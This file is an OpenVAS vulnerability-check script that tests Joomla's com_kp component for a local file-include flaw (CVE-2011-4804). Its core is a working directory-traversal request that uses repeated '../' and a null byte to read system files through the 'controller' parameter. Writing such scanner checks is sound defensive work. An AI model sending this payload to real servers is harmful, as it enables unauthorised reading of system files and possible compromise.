###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_51623.nasl 6720 2017-07-13 14:25:27Z cfischer $
#
# Joomla! 'com_kp' Component 'controller' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The 'com_kp' component for Joomla! is prone to a local file-
include vulnerability because it fails to properly sanitize user-
supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the computer; other attacks are
also possible.";


if (description)
{
 script_id(103398);
 script_bugtraq_id(51623);
 script_cve_id("CVE-2011-4804");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_version ("$Revision: 6720 $");

 script_name("Joomla! 'com_kp' Component 'controller' Parameter Local File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51623");
 script_xref(name : "URL" , value : "http://www.joomla.org");

 script_tag(name:"last_modification", value:"$Date: 2017-07-13 16:25:27 +0200 (Thu, 13 Jul 2017) $");
 script_tag(name:"creation_date", value:"2012-01-24 10:42:33 +0100 (Tue, 24 Jan 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("joomla_detect.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("joomla/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

if( ! dir = get_dir_from_kb(port:port, app:"joomla"))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/index.php?option=com_kp&controller=",crap(data:"../",length:6*9),files[file],"%00"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
